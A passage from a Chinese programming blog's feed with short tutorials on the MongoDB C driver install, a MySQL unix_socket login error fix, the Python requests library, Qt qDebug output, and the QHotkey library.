<p>又测试一个文件其最后压缩时生成的字典<br />
<img src="/uploads/images/data_structure/lzw_cpp/06.png" alt="" /></p>
<p>C++中char数组存储中文时，如果取其中一个char的话，由于char占用1个字节，使得中文发生截断（被分解），比如<code>string s=&quot;你好&quot;;</code> 不过上面的测试依然可以通过，只要在编码过程中将被截断的所有char依次写入编码文件中，在解码时按照同样的规则去读取char，最后还是可以解码成功的。<br />
<img src="/uploads/images/data_structure/lzw_cpp/07.png" alt="" /></p>
<p>就这样吧，等有空再来更新更新…</p>
<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
<p>《数据结构、算法与应用》<br />
<a href="https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch">Lempel–Ziv–Welch</a><br />
<a href="https://segmentfault.com/a/1190000011425787?utm_medium=referral&amp;utm_source=tuicool">LZW压缩算法原理解析</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB C Driver安装</title>
    <url>/mongodb-driver-install/</url>
    <content><![CDATA[<p>这次就MongoDB来记录下安装C Driver过程。</p>
<span id="more"></span>
<h3 id="install-mongodb-c-driver"><a class="markdownIt-Anchor" href="#install-mongodb-c-driver"></a> Install MongoDB C Driver</h3>
<p>我百度了一下，有关用C/C++调用MongoDB提供的接口的教程，貌似很少，我也没怎么Google，索性就看官网提供的文档算了，反正大部分都是代码。。。</p>
<p>MongoDB C Driver支持的平台如下</p>
<table>
<thead>
<tr>
<th>Supported Platforms</th>
</tr>
</thead>
<tbody>
<tr>
<td>Archlinux</td>
</tr>
<tr>
<td>Debian 8.1</td>
</tr>
<tr>
<td>macOS 10.10</td>
</tr>
<tr>
<td>Microsoft Windows Server 2008</td>
</tr>
<tr>
<td>RHEL 7.0, 7.1, 7.2</td>
</tr>
<tr>
<td>SUSE 12</td>
</tr>
<tr>
<td>Ubuntu 12.04, 14.04, 16.04</td>
</tr>
<tr>
<td>Clang 3.4, 3.5, 3.7, 3.8</td>
</tr>
<tr>
<td>GCC 4.6, 4.8, 4.9, 5.3</td>
</tr>
<tr>
<td>MinGW-W64</td>
</tr>
<tr>
<td>Visual Studio 2010, 2013, 2015</td>
</tr>
<tr>
<td>x86, x86_64, ARM (aarch64), Power8 (ppc64le), zSeries (s390x)</td>
</tr>
</tbody>
</table>
<h4 id="从包管理工具安装"><a class="markdownIt-Anchor" href="#从包管理工具安装"></a> 从包管理工具安装</h4>
<p>对于Debian或Ubuntu，可以直接从以下命令安装</p>
<blockquote>
<p>apt-get install libmongoc-1.0-0</p>
</blockquote>
<p>对于其他Linux系统，也是大同小异的。然而，我还是比较喜欢编译安装，感觉可控性更高些。</p>
<h4 id="编译安装"><a class="markdownIt-Anchor" href="#编译安装"></a> 编译安装</h4>
<blockquote>
<p>OpenSSL is required for authentication or for SSL connections to MongoDB. Kerberos or LDAP support requires Cyrus SASL.</p>
</blockquote>
<p>这一步我直接跳过。</p>
<p>注意 ，编译mongo-c-driver还需要 <strong>libbson</strong> 不过mongo-c-driver已经包含了该库源码</p>
<p>注意，<a href="http://mongoc.org/libmongoc/current/init-cleanup.html">–disable-automatic-init-and-cleanup</a> 是官网推荐的参数，意思大概就是 禁止自动初始化和释放，这应该跟调用库有关，不过我没有加上</p>
<p>默认安装到 /usr/local</p>
<p>之后就可以 make + make install</p>
<h4 id="building-from-git"><a class="markdownIt-Anchor" href="#building-from-git"></a> Building from git</h4>
<blockquote>
<p>git clone <a href="https://github.com/mongodb/mongo-c-driver.git">https://github.com/mongodb/mongo-c-driver.git</a></p>
</blockquote>
<p>这个方法我没怎么注意，有兴趣的可以自己尝试下</p>
<h4 id="其他平台的构建"><a class="markdownIt-Anchor" href="#其他平台的构建"></a> 其他平台的构建</h4>
<p>除了Linux，常用的Mac OS，Windows的安装方法这里就不在赘述了</p>
<h3 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h3>
<p>因为我是从源码编译安装的，在这过程中，也遇到了一些奇葩问题。<br />
configure默认prefix为 /usr/local，libmongoc-1.0，libbson-1.0头文件安装到/usr/local/include，以及相应的链接库在/usr/local/lib。这似乎没有什么错误。但是当我用编写代码时发现我引用头文件</p>
<blockquote>
<p>#include</p>
</blockquote>
<p>时看到它里面其实包含</p>
<blockquote>
<p>#include</p>
</blockquote>
<p>而经过 <code>locate bson.h</code>，结果发现只存在 /usr/local/include/libbson-1.0/bson.h。。。这就是问题了</p>
<p>于是我可以cp /usr/local/include/libbson-1.0 目录下所有文件到 /usr/include</p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>编译安装MongoDB C Driver算是简单了吧，与 MongoCXX 的安装方法相比，这的确算是简单了 😃</p>
<p>详细过程参阅 <strong>Installing the MongoDB C Driver</strong></p>
<p>bye~</p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>C</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql error 1524-unix_socket</title>
    <url>/mysql-error-unix-socket/</url>
    <content><![CDATA[<p>在登录MySQL时显示错误 <code>mysql &quot;ERROR 1524 (HY000): Plugin 'unix_socket' is not loaded&quot;</code></p>
<span id="more"></span>
<p>参考原文: <a href="https://askubuntu.com/questions/705458/ubuntu-15-10-mysql-error-1524-unix-socket">https://askubuntu.com/questions/705458/ubuntu-15-10-mysql-error-1524-unix-socket</a></p>
<p>解决办法</p>
<blockquote>
<p>/etc/init.d/mysql stop<br />
sudo killall mysqld_safe<br />
sudo killall mysqld<br />
sudo mysqld_safe –skip-grant-tables &amp;<br />
mysql -u root<br />
use mysql;<br />
update user set password=<strong>PASSWORD(“MySQL密码”)</strong> where User=’root’;<br />
update user set plugin=”<strong>mysql_native_password</strong>“;<br />
quit;<br />
/etc/init.d/mysql stop<br />
sudo kill -9 $(pgrep mysql)<br />
/etc/init.d/mysql start</p>
</blockquote>
<p>这是原文，挺详细的…</p>
<p>The “<strong>unix_socket</strong>” has been called by mysql authentication process (maybe related to a partial migration of database to mariadb, now removed). To get all stuff back working go su:</p>
<blockquote>
<p>sudo su</p>
</blockquote>
<p>then follow:</p>
<blockquote>
<p>/etc/init.d/mysql stop<br />
mysqld_safe –skip-grant-tables &amp;<br />
mysql -uroot</p>
</blockquote>
<p>This will completely stop mysql, bypass user authentication (no password needed) and connect to mysql with user “root”.</p>
<p>Now, in mysql console, go using mysql administrative db:</p>
<blockquote>
<p>use mysql;</p>
</blockquote>
<p>To reset root password to mynewpassword (change it at your wish), just to be sure of it:</p>
<blockquote>
<p>update user set password=PASSWORD(“mynewpassword”) where User=’root’;</p>
</blockquote>
<p>And this one will overwrite authentication method, remove the unix_socket request (and everything else), restoring a normal and working password method:</p>
<blockquote>
<p>update user set plugin=”mysql_native_password”;</p>
</blockquote>
<p>Exit mysql console:</p>
<blockquote>
<p>quit;</p>
</blockquote>
<p>Stop and start everything related to mysql:</p>
<blockquote>
<p>/etc/init.d/mysql stop<br />
kill -9 $(pgrep mysql)<br />
/etc/init.d/mysql start<br />
Don’t forget to exit the su mode.</p>
</blockquote>
<p>Now mySQL server is up and running. You can login it with root:</p>
<blockquote>
<p>mysql -u root -p</p>
</blockquote>
<p>or whatever you wish. Password usage is operative.</p>
<p>That’s it.</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Python requests模块</title>
    <url>/python-requests/</url>
    <content><![CDATA[<p>Python里有自带的 <strong>urllib</strong> 库,提供了许多强大的功能来获取URL信息,而 <strong>urllib2</strong> 则提供了一组基于请求(request)的功能.两者可以相铺相成.而今天的主角是第三方库 <strong>requests</strong> ,其以简单的方式去获取URL,复杂性没有urllib高</p>
<span id="more"></span>
<h3 id="获取requests"><a class="markdownIt-Anchor" href="#获取requests"></a> 获取requests</h3>
<p>最简单的方法就是 <code>pip install requests</code> ,然后就可以使用了</p>
<h3 id="发送请求"><a class="markdownIt-Anchor" href="#发送请求"></a> 发送请求</h3>
<p>首先,需要导入 Requests 模块,这里就介绍 <strong>get</strong> 函数</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">url, params=<span class="hljs-literal">None</span>, **kwargs</span>):</span><br>    <span class="hljs-string">r&quot;&quot;&quot;Sends a GET request.</span><br><span class="hljs-string">    :param url: URL for the new :class:`Request` object.</span><br><span class="hljs-string">    :param params: (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.</span><br><span class="hljs-string">    :param \*\*kwargs: Optional arguments that ``request`` takes.</span><br><span class="hljs-string">    :return: :class:`Response &lt;Response&gt;` object</span><br><span class="hljs-string">    :rtype: requests.Response</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    kwargs.setdefault(<span class="hljs-string">&#x27;allow_redirects&#x27;</span>, <span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> request(<span class="hljs-string">&#x27;get&#x27;</span>, url, params=params, **kwargs)<br></code></pre></div></td></tr></table></figure>
<p>可以看到 requests.get 函数 实际是调用了 <strong>requests.Request</strong> 构造请求参数,并返回一个 <strong>requests.Response</strong> 响应对象</p>
<p>类似的,还有 put,delete,head,post,option 请求函数</p>
<h4 id="例1"><a class="markdownIt-Anchor" href="#例1"></a> 例1</h4>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">    query=&#123;<span class="hljs-string">&#x27;test1&#x27;</span>:<span class="hljs-string">&#x27;123456789&#x27;</span>,<span class="hljs-string">&#x27;test2&#x27;</span>:<span class="hljs-string">&#x27;123456789&#x27;</span>&#125;<br>    r=requests.get(url=<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>,params=query)<br>    <span class="hljs-built_in">print</span> r.url  <span class="hljs-comment">#返回URL地址</span><br>    <span class="hljs-built_in">print</span> r.status_code  <span class="hljs-comment">#返回状态码</span><br>    <span class="hljs-built_in">print</span> r.encoding	<span class="hljs-comment">#编码格式</span><br>    <span class="hljs-built_in">print</span> r.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>]	<span class="hljs-comment">#获取网页header </span><br>    <span class="hljs-built_in">print</span> r.cookies  <span class="hljs-comment">#获取cookies</span><br>    <span class="hljs-built_in">print</span> r.text     <span class="hljs-comment">#Requests自动解码后数据</span><br>    <span class="hljs-built_in">print</span> r.content <span class="hljs-comment">#获取二进制响应内容</span><br>    <span class="hljs-built_in">print</span> r.json()  <span class="hljs-comment">#JSON 响应内容 可以和 json 模块使用</span><br>输出:<br>https://www.baidu.com/?test1=<span class="hljs-number">123456789</span>&amp;test2=<span class="hljs-number">123456789</span><br><span class="hljs-number">200</span><br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><br>text/html<br>&lt;RequestsCookieJar[&lt;Cookie BDORZ=<span class="hljs-number">27315</span> <span class="hljs-keyword">for</span> .baidu.com/&gt;]&gt; <br>返回数据太多,这里不显示了<br></code></pre></div></td></tr></table></figure>
<p>注意,get函数的params为查询字符串</p>
<h4 id="例2"><a class="markdownIt-Anchor" href="#例2"></a> 例2</h4>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">   user_agent = <span class="hljs-string">&#x27;Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36&#x27;</span><br>    headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: user_agent&#125;<br>    data=&#123;<span class="hljs-string">&#x27;key1&#x27;</span>:<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;key2&#x27;</span>:<span class="hljs-string">&#x27;world&#x27;</span>&#125;<br>    r=requests.post(url=<span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span>,headers=headers,data=data)<br>    <span class="hljs-built_in">print</span> r.text<br>    <br>    <br>输出:<br>&#123;<br>  <span class="hljs-string">&quot;args&quot;</span>: &#123;&#125;, <br>  <span class="hljs-string">&quot;data&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <br>  <span class="hljs-string">&quot;files&quot;</span>: &#123;&#125;, <br>  <span class="hljs-string">&quot;form&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;key1&quot;</span>: <span class="hljs-string">&quot;hello&quot;</span>, <br>    <span class="hljs-string">&quot;key2&quot;</span>: <span class="hljs-string">&quot;world&quot;</span><br>  &#125;, <br>  <span class="hljs-string">&quot;headers&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <br>    <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <br>    <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <br>    <span class="hljs-string">&quot;Content-Length&quot;</span>: <span class="hljs-string">&quot;21&quot;</span>, <br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;httpbin.org&quot;</span>, <br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36&quot;</span><br>  &#125;<br>  ...<br></code></pre></div></td></tr></table></figure>
<p>这是一个 POST 请求 ,其中 <strong>data</strong> 参数表示要提交给服务器的数据 ,<strong>headers</strong> 是一个字典类型的请求头,此处我只指定了 <strong>User-Agent</strong> .</p>
<h3 id="代理访问"><a class="markdownIt-Anchor" href="#代理访问"></a> 代理访问</h3>
<p>为了访问一些被Q的网站,往往需要设置代理,幸运的是,requests同样也提供的代理这一功能,与之有关的参数为 <strong>proxies</strong></p>
<h4 id="例3"><a class="markdownIt-Anchor" href="#例3"></a> 例3</h4>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">proxy=&#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://127.0.0.1:8087&#x27;</span>,<br>		<span class="hljs-string">&#x27;https&#x27;</span>:<span class="hljs-string">&#x27;http://127.0.0.1:8087&#x27;</span>&#125;<br>r=requests.get(url=<span class="hljs-string">&#x27;https://www.google.com&#x27;</span>,proxies=proxy,verify=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span> r.text<br><span class="hljs-built_in">print</span> r.status_code<br></code></pre></div></td></tr></table></figure>
<p>如果代理需要账户和密码, 则</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">proxies=&#123;<br>	<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://username:password@127.0.0.1:8087&quot;</span><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>我把 <strong>verify</strong> 设置为 False,是为了SSL证书验证.</p>
<p>也可以通过环境变量 <strong>HTTP_PROXY</strong> 和 <strong>HTTPS_PROXY</strong> 来配置代理</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">$ export HTTP_PROXY=<span class="hljs-string">&quot;http://10.10.1.10:3128&quot;</span><br>$ export HTTPS_PROXY=<span class="hljs-string">&quot;http://10.10.1.10:1080&quot;</span><br>$ python<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> requests<br><span class="hljs-meta">&gt;&gt;&gt; </span>requests.get(<span class="hljs-string">&quot;http://example.org&quot;</span>)<br></code></pre></div></td></tr></table></figure>
<h3 id="会话session"><a class="markdownIt-Anchor" href="#会话session"></a> 会话(Session)</h3>
<p>会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie， 期间使用 <code>urllib3</code> 的 <a href="http://urllib3.readthedocs.io/en/latest/reference/index.html#module-urllib3.connectionpool">connection pooling</a> 功能。所以如果你向同一主机发送多个请求，底层的 TCP 连接将会被重用，从而带来显著的性能提升。 (参见 <a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection">HTTP persistent connection</a> ).</p>
<p>使用之前需导入类: <code>from requests import Session</code></p>
<h3 id="准备的请求prepared-request"><a class="markdownIt-Anchor" href="#准备的请求prepared-request"></a> 准备的请求(Prepared Request)</h3>
<p>当你从 API 或者会话调用中收到一个 Response 对象时，request 属性其实是使用了 PreparedRequest。有时在发送请求之前，你需要对 body 或者 header （或者别的什么东西）做一些额外处理</p>
<h4 id="例4"><a class="markdownIt-Anchor" href="#例4"></a> 例4</h4>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">user_agent = <span class="hljs-string">&#x27;Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36&#x27;</span><br>    headers=&#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:user_agent&#125;<br>    <span class="hljs-comment"># 开启回话</span><br>    s= requests.Session()<br>    req=requests.Request(<span class="hljs-string">&#x27;GET&#x27;</span>,url=<span class="hljs-string">&#x27;http://baidu.com&#x27;</span>)<br>    <span class="hljs-comment"># 开始准备一个请求</span><br>    prepped= s.prepare_request(req)<br>    <br>    <span class="hljs-comment"># do something with prepped.body</span><br>    <span class="hljs-comment"># do something with prepped.headers</span><br>    prepped.prepare_headers(headers)<br>    <span class="hljs-comment"># 发送以准备好的请求</span><br>    resp= s.send(prepped,timeout=<span class="hljs-number">5</span>)<br>    <span class="hljs-built_in">print</span> resp.status_code<br>    s.close()<br></code></pre></div></td></tr></table></figure>
<h3 id="事件挂钩"><a class="markdownIt-Anchor" href="#事件挂钩"></a> 事件挂钩</h3>
<p>Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理</p>
<blockquote>
<p>可用的钩子:<br />
<strong>response</strong> :<br />
从一个请求产生的响应</p>
</blockquote>
<p>可以通过传递一个 {hook_name: callback_function} 字典给 <strong>hooks</strong> 请求参数为每个请求分配一个钩子函数：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">hooks=<span class="hljs-built_in">dict</span>(response=print_url)<br></code></pre></div></td></tr></table></figure>
<p><strong>callback_function</strong> 会接受一个数据块作为它的第一个参数</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_url</span>(<span class="hljs-params">r, *args, **kwargs</span>):</span><br>    <span class="hljs-built_in">print</span>(r.url)<br></code></pre></div></td></tr></table></figure>
<h4 id="例5"><a class="markdownIt-Anchor" href="#例5"></a> 例5</h4>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_urls</span>(<span class="hljs-params">r,*args,**kwargs</span>):</span><br>    <span class="hljs-built_in">print</span> r.url<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s=requests.Session()<br>    <span class="hljs-comment"># 钩子</span><br>    s.hooks=<span class="hljs-built_in">dict</span>(response=print_urls)<br>    req= requests.Request(<span class="hljs-string">&#x27;GET&#x27;</span>,url=<span class="hljs-string">&#x27;https://www.github.com&#x27;</span>,headers=header)<br>   <br>    pre=s.prepare_request(req)<br>    pre.prepare_headers(header)<br>    resp=s.send(pre)<br>    <span class="hljs-built_in">print</span> resp.headers<br>    <span class="hljs-keyword">pass</span><br></code></pre></div></td></tr></table></figure>
<p>参考</p>
<p><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a></p>
<p>good~</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Qt5 qDebug()不显示调试信息</title>
    <url>/qt-qdebug/</url>
    <content><![CDATA[<p>之前不知怎么,Qt <strong>qDebug()</strong> 无法输出调试信息,不过诸如<br />
<code>qWarning()</code> <code>qCritical()</code> 可以正常输出</p>
<span id="more"></span>
<h4 id="方法"><a class="markdownIt-Anchor" href="#方法"></a> 方法</h4>
<p>之前我是用 <strong>qInstallMessageHandler(QtMessageHandler)</strong> 捕获信息,同样也是无法输出 qDebug() 的信息.</p>
<p>最后还是在Qt官网论坛发出帖子寻求帮助<br />
<a href="https://forum.qt.io/topic/86358/qdebug-can-t-output-text">https://forum.qt.io/topic/86358/qdebug-can-t-output-text</a></p>
<p>从这个网站找到解决方法 <a href="https://brendanwhitfield.wordpress.com/2016/06/08/enabling-qdebug-on-fedora/">https://brendanwhitfield.wordpress.com/2016/06/08/enabling-qdebug-on-fedora/</a></p>
<blockquote>
<p>When writing Qt applications, it’s helpful to use a qDebug() statement once in a while. However, I’ve recently found that qDebug() on stock Fedora no longer prints, while qWarning() does. The first thing that the internet tells you is to add CONFIG += console to your .pro file, but alas, this is not the solution. It turns out, because of the way Qt is setup on Fedora, debug output is no longer emitted on stderr (by design). Thanks to this bug report, the solution is to create the following file in either of these locations:</p>
<ul>
<li><strong>~/.config/QtProject/qtlogging.ini (for your user only)</strong></li>
<li><strong>/etc/xdg/QtProject/qtlogging.ini (system-wide)</strong></li>
</ul>
<p><strong>[Rules].debug=trueqt…debug=false</strong></p>
<p>The first rule enables all debug output, while the second disables Qt’s internal debug statements. This prevents a deluge of output from Qt when debugging your application.</p>
</blockquote>
<p>我修改 <code>/etc/xdg/QtProject/qtlogging.ini</code> 文件<br />
为</p>
<blockquote>
<p>*<em>[Rules]</em> .debug=true<br />
qt.*.debug=false</p>
</blockquote>
<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt注册热键QHotkey</title>
    <url>/qt-reg-hotkey/</url>
    <content><![CDATA[<p>要想在Qt支持全局注册热键，Windows下方法很简单RegisterHotKey函数可以满足。当然，这只能在Windows下操作，那么，是否有一个跨平台的全局注册热键库方便使用呢？</p>
<span id="more"></span>
<h3 id="qhotkey"><a class="markdownIt-Anchor" href="#qhotkey"></a> QHotkey</h3>
<p><a href="https://www.qpm.io/packages/de.skycoder42.qhotkey/index.html">官网</a></p>
<p><a href="https://github.com/Skycoder42/QHotkey">Github</a></p>
<p><a href="https://skycoder42.github.io/QHotkey/class_q_hotkey.html">QHotkey类参考</a></p>
<p><strong>PS: QHotkey适用于 Windows, Mac ， X11</strong></p>
<p>从github上获取源文件，自行编译(无需安装)</p>
<blockquote>
<p>git clone <a href="https://github.com/Skycoder42/QHotkey.git">https://github.com/Skycoder42/QHotkey.git</a><br />
cd QHotkey<br />
qmake<br />
make</p>
</blockquote>
<p>之后就可以使用了。使用方法如下<br />
创建一个Qt项目，在 .pro 中添加</p>
<p>include(QHotkey/qhotkey.pri)<br />
LIBS += -L$$PWD/QHotkey/QHotkey -lQHotkey<br />
INCLUDEPATH += $$PWD/QHotkey/QHotkey</p>
<p>注意，我把 QHotkey 文件夹复制到项目目录下，并且要include <strong>qhotkey.pri</strong><br />
LIBS 和 INCLUDEPATH不能直接写成，否则出现 <strong>No such file or directory</strong>：<br />
LIBS += -LQHotkey/QHotkey -lQHotkey<br />
INCLUDEPATH += QHotkey/QHotkey</p>
<p>主要代码实例</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;QHotkey&quot;</span></span><br><span class="hljs-keyword">bool</span> ispressed=<span class="hljs-literal">false</span>;<br>Widget::<span class="hljs-built_in">Widget</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QWidget</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::Widget)<br>&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-comment">// 过滤警告</span><br>    QLoggingCategory::<span class="hljs-built_in">setFilterRules</span>(<span class="hljs-built_in">QStringLiteral</span>(<span class="hljs-string">&quot;QHotkey.warning=false&quot;</span>));<br>	<span class="hljs-comment">// Ctrl+P 之间不能有空格</span><br>    QHotkey *hotkey = <span class="hljs-keyword">new</span> QHotkey&#123;<span class="hljs-built_in">QKeySequence</span>(<span class="hljs-string">&quot;Ctrl+P&quot;</span>),<span class="hljs-literal">true</span>&#125;; <br>    <span class="hljs-built_in">connect</span>(hotkey, &amp;QHotkey::activated, [<span class="hljs-keyword">this</span>]()&#123;<br>        <span class="hljs-comment">//这里进行判断,只允许按下一次</span><br>        <span class="hljs-keyword">if</span>(ispressed==<span class="hljs-literal">false</span>)&#123;<br>            ispressed=<span class="hljs-literal">true</span>;<br>            QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;Hello&quot;</span>);<br>            ispressed=<span class="hljs-literal">false</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            ispressed=<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>     &#125;);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>默认的，QHotkey会打印一些警告信息，不过可以用 <strong>QLoggingCategory::setFilterRules</strong> 过滤掉这些信息。</p>
